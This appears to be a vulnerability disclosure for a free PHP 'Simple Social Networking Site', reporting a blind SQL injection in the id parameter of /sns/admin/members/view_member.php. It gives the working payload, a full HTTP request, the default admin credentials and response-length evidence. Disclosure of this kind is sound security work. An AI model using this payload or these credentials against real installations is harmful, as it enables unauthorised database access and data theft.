# Simple Social Networking Site v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Vulnerability File: /sns/admin/members/view_member.php?id=

Vulnerability location: /sns/admin/members/view_member.php?id=,id

[+] Payload: /sns/admin/members/view_member.php?id=3%27%20and%20length(database())%20=6--+ // Leak place ---> id

Current database name: sns_db,length is 6

```sql
GET /sns/admin/members/view_member.php?id=3%27%20and%20length(database())%20=6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 5, Content-Length: 945

![image](https://user-images.githubusercontent.com/54017627/166927633-a1ba1f95-7536-4acf-9f32-172937ae3138.png)

![image](https://user-images.githubusercontent.com/54017627/166928434-7311a046-2d9d-4b82-bb96-46bf6a63dd57.png)

When length (database ()) = 6, Content-Length: 981

![image](https://user-images.githubusercontent.com/54017627/166927585-561c06f4-3640-41c2-8202-5516bf2f78cd.png)

![image](https://user-images.githubusercontent.com/54017627/166928387-7a494c77-c576-49ed-abcd-e169c43e2f33.png)
